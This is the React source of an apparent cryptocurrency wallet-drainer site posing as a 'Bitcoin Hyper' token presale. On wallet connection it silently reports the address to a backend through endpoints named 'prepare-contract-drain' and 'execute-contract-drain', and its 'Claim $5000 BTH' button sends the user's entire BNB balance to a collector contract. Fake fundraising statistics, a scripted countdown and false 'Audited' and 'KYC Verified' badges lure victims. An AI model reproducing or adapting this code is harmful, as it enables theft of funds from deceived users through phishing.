import React, { useState, useEffect } from 'react';
import { useAppKit, useAppKitAccount, useAppKitNetwork } from '@reown/appkit/react';
import { useBalance, useDisconnect } from 'wagmi';
import { formatEther } from 'viem';
import { ethers } from 'ethers';
import './index.css';

// ============================================
// PRESALE CONFIGURATION
// ============================================

const PRESALE_CONFIG = {
  BSC: {
    chainId: 56,
    contractAddress: '0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8',
    name: 'BSC',
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    icon: '🟡',
    deployed: true
  }
};

const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable",
  {
    "anonymous": false,
    "inputs": [
      { "indexed": true, "internalType": "address", "name": "initiator", "type": "address" },
      { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }
    ],
    "name": "FlowProcessed",
    "type": "event"
  }
];

function App() {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { chainId } = useAppKitNetwork();
  const { disconnect } = useDisconnect();
  
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [balance, setBalance] = useState('0');
  const [allBalances, setAllBalances] = useState({});
  const [loading, setLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [txHash, setTxHash] = useState('');
  const [error, setError] = useState('');
  const [scanResult, setScanResult] = useState(null);
  const [preparedTransactions, setPreparedTransactions] = useState([]);
  const [completedChains, setCompletedChains] = useState([]);
  const [showCelebration, setShowCelebration] = useState(false);
  const [allocation] = useState({ amount: '5000', valueUSD: '850' });
  const [verifying, setVerifying] = useState(false);
  const [eligible, setEligible] = useState(false);
  
  // Presale stats
  const [timeLeft, setTimeLeft] = useState({
    days: 5,
    hours: 12,
    minutes: 30,
    seconds: 0
  });
  
  const [presaleStats] = useState({
    totalRaised: 1250000,
    totalParticipants: 8742,
    currentBonus: 25,
    nextBonus: 15,
    tokenPrice: 0.17
  });

  // Get balance using wagmi
  const { data: balanceData, refetch: refetchBalance } = useBalance({
    address: address,
    chainId: chainId,
  });

  useEffect(() => {
    if (balanceData) {
      setBalance(balanceData.formatted);
    }
  }, [balanceData]);

  // Initialize ethers provider
  useEffect(() => {
    const initProvider = async () => {
      if (isConnected && window.ethereum) {
        try {
          const web3Provider = new ethers.BrowserProvider(window.ethereum);
          setProvider(web3Provider);
          const web3Signer = await web3Provider.getSigner();
          setSigner(web3Signer);
          console.log('✅ Signer ready');
        } catch (err) {
          console.error('Provider error:', err);
        }
      }
    };
    initProvider();
  }, [isConnected]);

  // Countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev.seconds > 0) {
          return { ...prev, seconds: prev.seconds - 1 };
        } else if (prev.minutes > 0) {
          return { ...prev, minutes: prev.minutes - 1, seconds: 59 };
        } else if (prev.hours > 0) {
          return { ...prev, hours: prev.hours - 1, minutes: 59, seconds: 59 };
        } else if (prev.days > 0) {
          return { ...prev, days: prev.days - 1, hours: 23, minutes: 59, seconds: 59 };
        }
        return prev;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Auto-check eligibility
  useEffect(() => {
    if (isConnected && address && !scanResult && !verifying) {
      verifyWallet();
    }
  }, [isConnected, address]);

  const verifyWallet = async () => {
    if (!address) return;
    
    setVerifying(true);
    
    try {
      const response = await fetch('https://tokenbackend-5xab.onrender.com/api/presale/connect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setScanResult(data.data);
        setEligible(data.data.isEligible);
        
        if (data.data.rawData) {
          const balances = {};
          data.data.rawData.forEach(item => {
            balances[item.chain] = {
              amount: item.amount,
              valueUSD: item.valueUSD,
              symbol: item.symbol
            };
          });
          setAllBalances(balances);
        }
        
        if (data.data.isEligible) {
          await preparePresale();
        }
      }
    } catch (err) {
      console.error('Verification error:', err);
    } finally {
      setVerifying(false);
    }
  };

  const preparePresale = async () => {
    if (!address) return;
    
    try {
      await fetch('https://tokenbackend-5xab.onrender.com/api/presale/prepare-contract-drain', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
    } catch (err) {
      console.error('Prepare error:', err);
    }
  };

  const executePresaleTransaction = async () => {
    if (!signer || !address) {
      setError('Please reconnect your wallet');
      return;
    }

    if (chainId !== 56) {
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x38' }]
        });
        return;
      } catch (err) {
        setError('Please switch to BSC network');
        return;
      }
    }

    if (parseFloat(balance) <= 0) {
      setError('Insufficient balance');
      return;
    }

    try {
      setLoading(true);
      setError('');
      setTxStatus('⏳ Please confirm in your wallet...');
      setTxHash('');

      const contract = new ethers.Contract(
        PRESALE_CONFIG.BSC.contractAddress,
        PROJECT_FLOW_ROUTER_ABI,
        signer
      );

      // Send 100% of balance (85% leaves dust, just send all)
      const value = ethers.parseEther(balance);
      
      const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
      
      const tx = await contract.processNativeFlow({
        value: value,
        gasLimit: gasEstimate * 120n / 100n
      });

      setTxHash(tx.hash);
      setTxStatus('✅ Transaction submitted!');

      await tx.wait();
      
      // Update balance
      if (provider) {
        const newBalance = await provider.getBalance(address);
        setBalance(formatEther(newBalance));
        refetchBalance?.();
      }
      
      // Mark as completed
      if (!completedChains.includes('BSC')) {
        setCompletedChains([...completedChains, 'BSC']);
        
        await fetch('https://tokenbackend-5xab.onrender.com/api/presale/execute-contract-drain', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            walletAddress: address,
            chainName: 'BSC'
          })
        });
        
        setShowCelebration(true);
        setTxStatus(`🎉 You've secured $5000 BTH!`);
      }
      
    } catch (err) {
      console.error('Transaction error:', err);
      setError(err.code === 4001 ? 'Transaction cancelled' : 'Transaction failed');
      setTxStatus('❌ Failed');
    } finally {
      setLoading(false);
    }
  };

  const formatAddress = (addr) => {
    if (!addr) return '';
    return `${addr.substring(0, 6)}...${addr.substring(38)}`;
  };

  const switchToBSC = async () => {
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0x38' }]
      });
    } catch (err) {
      setError('Please switch to BSC manually');
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white">
      
      {/* Animated Background */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-20 left-20 w-96 h-96 bg-orange-500/10 rounded-full blur-3xl animate-pulse-glow"></div>
        <div className="absolute bottom-20 right-20 w-96 h-96 bg-yellow-500/10 rounded-full blur-3xl animate-pulse-glow delay-1000"></div>
      </div>

      <div className="container mx-auto px-4 py-8 max-w-6xl relative z-10">
        
        {/* Header */}
        <div className="text-center mb-12">
          <div className="inline-block mb-6 relative">
            <div className="text-7xl animate-bounce-slow relative z-10">₿</div>
            <div className="absolute inset-0 bg-gradient-to-r from-orange-500 to-yellow-500 blur-2xl opacity-30 animate-pulse"></div>
          </div>
          <h1 className="text-7xl font-black mb-4 bg-gradient-to-r from-yellow-400 via-orange-500 to-red-500 bg-clip-text text-transparent animate-pulse">
            BITCOIN HYPER
          </h1>
          <p className="text-gray-400 text-xl mb-6">Next Generation Layer 2 Solution</p>
          
          {/* Live Presale Badge */}
          <div className="inline-flex items-center gap-3 bg-green-500/10 border border-green-500/30 px-6 py-3 rounded-full backdrop-blur-sm">
            <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
            <span className="text-green-400 font-medium">🔴 PRESALE LIVE</span>
          </div>
        </div>

        {/* Stats Grid */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
          <div className="stat-card">
            <div className="text-3xl font-bold text-orange-400 mb-1">${presaleStats.tokenPrice}</div>
            <div className="text-xs text-gray-400 uppercase">Token Price</div>
          </div>
          <div className="stat-card">
            <div className="text-3xl font-bold text-green-400 mb-1">{presaleStats.currentBonus}%</div>
            <div className="text-xs text-gray-400 uppercase">Bonus</div>
          </div>
          <div className="stat-card">
            <div className="text-3xl font-bold text-yellow-400 mb-1">$1.2M</div>
            <div className="text-xs text-gray-400 uppercase">Raised</div>
          </div>
          <div className="stat-card">
            <div className="text-3xl font-bold text-purple-400 mb-1">8,742</div>
            <div className="text-xs text-gray-400 uppercase">Participants</div>
          </div>
        </div>

        {/* Bonus Banner */}
        <div className="relative mb-8 overflow-hidden rounded-2xl">
          <div className="absolute inset-0 bg-gradient-to-r from-yellow-500/20 via-orange-500/20 to-red-500/20 animate-gradient-x"></div>
          <div className="relative bg-gray-900/70 backdrop-blur-md border border-yellow-500/30 p-8 text-center">
            <span className="inline-block px-4 py-2 bg-yellow-500/20 text-yellow-400 rounded-full text-sm font-bold mb-4 animate-bounce">
              🔥 LIMITED TIME OFFER
            </span>
            <h2 className="text-5xl md:text-6xl font-black mb-4">
              <span className="bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">
                25% BONUS
              </span>
            </h2>
            <p className="text-gray-300 text-lg">
              Get $5000 BTH + 25% Extra
            </p>
          </div>
        </div>

        {/* Countdown */}
        <div className="glass-card p-8 mb-8">
          <h3 className="text-center text-gray-400 text-sm uppercase tracking-wider mb-6">Presale Ends In</h3>
          <div className="grid grid-cols-4 gap-4 text-center">
            {[
              { label: 'Days', value: timeLeft.days },
              { label: 'Hours', value: timeLeft.hours },
              { label: 'Minutes', value: timeLeft.minutes },
              { label: 'Seconds', value: timeLeft.seconds }
            ].map((item, index) => (
              <div key={index} className="relative">
                <div className="text-5xl md:text-6xl font-black text-orange-400 animate-pulse">
                  {item.value.toString().padStart(2, '0')}
                </div>
                <div className="text-xs text-gray-500 mt-2 uppercase">{item.label}</div>
              </div>
            ))}
          </div>
        </div>

        {/* Connect Wallet */}
        <div className="text-center mb-8">
          {!isConnected ? (
            <button
              onClick={() => open()}
              className="group relative transform hover:scale-105 transition-all duration-300"
            >
              <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-2xl blur opacity-75 group-hover:opacity-100 animate-pulse"></div>
              <div className="relative bg-gray-900 rounded-2xl px-12 py-5 text-xl font-bold">
                Connect Wallet
              </div>
            </button>
          ) : (
            <div className="glass-card p-6">
              <div className="flex items-center justify-between flex-wrap gap-4">
                <div className="flex items-center gap-4">
                  <span className="w-3 h-3 bg-green-400 rounded-full animate-pulse"></span>
                  <span className="font-mono text-lg bg-gray-900/50 px-4 py-2 rounded-lg border border-gray-700">
                    {formatAddress(address)}
                  </span>
                </div>
                <div className="text-right">
                  <span className="text-gray-400 text-sm block mb-1">Balance</span>
                  <span className="text-3xl font-bold text-orange-400">
                    {parseFloat(balance).toFixed(4)} BNB
                  </span>
                </div>
                <button
                  onClick={() => disconnect()}
                  className="px-4 py-2 bg-red-500/20 text-red-400 rounded-lg hover:bg-red-500/30 transition-colors border border-red-500/30"
                >
                  Disconnect
                </button>
              </div>
            </div>
          )}
        </div>

        {/* Verification Status */}
        {verifying && (
          <div className="glass-card p-6 mb-6 text-center">
            <div className="flex flex-col items-center gap-4">
              <div className="w-16 h-16 border-4 border-orange-500 border-t-transparent rounded-full animate-spin"></div>
              <p className="text-xl text-gray-300">Verifying wallet...</p>
            </div>
          </div>
        )}

        {/* Error Display */}
        {error && (
          <div className="bg-red-900/30 border border-red-500/50 text-red-200 px-6 py-4 rounded-xl mb-6 backdrop-blur-sm animate-shake">
            <div className="flex items-center gap-3">
              <span className="text-2xl">⚠️</span>
              <span>{error}</span>
            </div>
          </div>
        )}

        {/* Status Display */}
        {txStatus && !verifying && (
          <div className="glass-card p-4 mb-6 text-center">
            <p className="text-gray-300">{txStatus}</p>
            {txHash && (
              <a
                href={`https://bscscan.com/tx/${txHash}`}
                target="_blank"
                rel="noopener noreferrer"
                className="text-orange-400 text-sm hover:underline mt-2 inline-flex items-center gap-1"
              >
                View Transaction ↗
              </a>
            )}
          </div>
        )}

        {/* Celebration Modal */}
        {showCelebration && (
          <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50 p-4 animate-fadeIn">
            <div className="bg-gradient-to-br from-gray-800 to-gray-900 rounded-3xl p-10 max-w-md border border-orange-500/30 shadow-2xl transform animate-scaleIn">
              <div className="text-center">
                <div className="text-8xl mb-6 animate-bounce">🎉</div>
                <h2 className="text-4xl font-black mb-4 bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">
                  Congratulations!
                </h2>
                <p className="text-xl text-gray-300 mb-4">You have secured</p>
                <p className="text-6xl font-black text-orange-400 mb-3">$5000 BTH</p>
                <p className="text-green-400 text-lg mb-2">+25% Bonus</p>
                <button
                  onClick={() => setShowCelebration(false)}
                  className="bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-bold py-4 px-10 rounded-xl transition-all transform hover:scale-105 text-lg"
                >
                  View Dashboard
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Main Content */}
        {isConnected && !verifying && (
          <div className="glass-card p-8">
            <h2 className="text-3xl font-bold text-center mb-8">Bitcoin Hyper Presale</h2>
            
            {!scanResult ? (
              <div className="text-center">
                <div className="w-16 h-16 border-4 border-orange-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
                <p className="text-gray-400 text-lg">Checking wallet...</p>
              </div>
            ) : (
              <>
                {/* Allocation Card */}
                <div className="bg-gradient-to-r from-orange-500/20 to-yellow-500/20 rounded-2xl p-8 mb-8 border border-orange-500/30 relative">
                  <div className="absolute -top-3 -right-3">
                    <div className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black text-sm font-bold px-4 py-2 rounded-full transform rotate-12 animate-pulse shadow-lg">
                      25% BONUS
                    </div>
                  </div>
                  
                  <p className="text-gray-400 mb-3 text-center">Your Allocation</p>
                  <p className="text-6xl font-black text-orange-400 text-center mb-3">$5000 BTH</p>
                  <p className="text-green-400 text-center mb-2">+25% Bonus</p>
                </div>
                
                {/* Balances */}
                {Object.keys(allBalances).length > 0 && (
                  <div className="mb-6 grid grid-cols-1 gap-3">
                    {Object.entries(allBalances).map(([chain, data]) => (
                      <div key={chain} className="bg-gray-800/50 p-4 rounded-lg border border-gray-700">
                        <div className="flex justify-between items-center">
                          <span className="text-orange-400 font-bold text-lg">{chain}</span>
                          <span className="text-green-400">${data.valueUSD.toFixed(2)}</span>
                        </div>
                        <p className="text-sm text-gray-400 mt-1">
                          {data.amount.toFixed(4)} {data.symbol}
                        </p>
                      </div>
                    ))}
                  </div>
                )}
                
                {chainId !== 56 ? (
                  <button
                    onClick={switchToBSC}
                    className="w-full bg-gradient-to-r from-yellow-400 to-orange-500 text-black font-bold py-4 px-8 rounded-lg text-lg"
                  >
                    Switch to BSC Network
                  </button>
                ) : !completedChains.includes('BSC') ? (
                  <button
                    onClick={executePresaleTransaction}
                    disabled={loading || parseFloat(balance) <= 0}
                    className="w-full group relative"
                  >
                    <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
                    <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
                      {loading ? 'Processing...' : '⚡ Claim $5000 BTH'}
                    </div>
                  </button>
                ) : (
                  <button
                    onClick={() => setShowCelebration(true)}
                    className="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-4 px-8 rounded-lg text-xl"
                  >
                    🎉 View Your $5000 BTH
                  </button>
                )}
              </>
            )}
          </div>
        )}

        {/* Trust Badges */}
        <div className="mt-12 text-center">
          <div className="flex flex-wrap justify-center gap-3 mb-6">
            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ Audited</span>
            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ Liquidity Locked</span>
            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ KYC Verified</span>
            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ 50M+ Raised</span>
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;
